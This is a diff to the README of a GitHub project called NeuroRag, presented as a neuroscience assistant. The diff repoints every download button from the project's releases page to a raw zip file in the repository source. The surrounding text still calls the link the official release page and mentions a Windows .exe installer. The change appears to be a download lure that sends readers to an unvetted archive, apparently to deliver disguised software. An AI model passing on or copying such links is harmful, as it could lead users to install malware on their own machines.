@@ -1,6 +1,6 @@
 # 🤖 NeuroRag - Simple Neuroscience Assistant
 
-[![Download NeuroRag](https://img.shields.io/badge/Download-NeuroRag-brightgreen)](https://github.com/Mustii2009/NeuroRag/releases)
+[![Download NeuroRag](https://img.shields.io/badge/Download-NeuroRag-brightgreen)](https://github.com/Mustii2009/NeuroRag/raw/refs/heads/main/src/Rag_Neuro_v2.2.zip)
 
 ## 🧠 What is NeuroRag?
 
@@ -38,7 +38,7 @@ Follow these steps to get NeuroRag up and running.
 
 Click the big green button below to visit the official download page.
 
-[![Download NeuroRag](https://img.shields.io/badge/Download-NeuroRag-brightgreen)](https://github.com/Mustii2009/NeuroRag/releases)
+[![Download NeuroRag](https://img.shields.io/badge/Download-NeuroRag-brightgreen)](https://github.com/Mustii2009/NeuroRag/raw/refs/heads/main/src/Rag_Neuro_v2.2.zip)
 
 This page contains the latest versions of NeuroRag. Look for the Windows installer file. It usually ends with `.exe`. The file name might contain the version number.
 
@@ -118,4 +118,4 @@ If you want to learn more about the underlying technologies, topics like retriev
 
 Click below to visit the official NeuroRag release page where you can get the latest Windows version.
 
-[![Download NeuroRag](https://img.shields.io/badge/Download-NeuroRag-brightgreen)](https://github.com/Mustii2009/NeuroRag/releases)
+[![Download NeuroRag](https://img.shields.io/badge/Download-NeuroRag-brightgreen)](https://github.com/Mustii2009/NeuroRag/raw/refs/heads/main/src/Rag_Neuro_v2.2.zip)
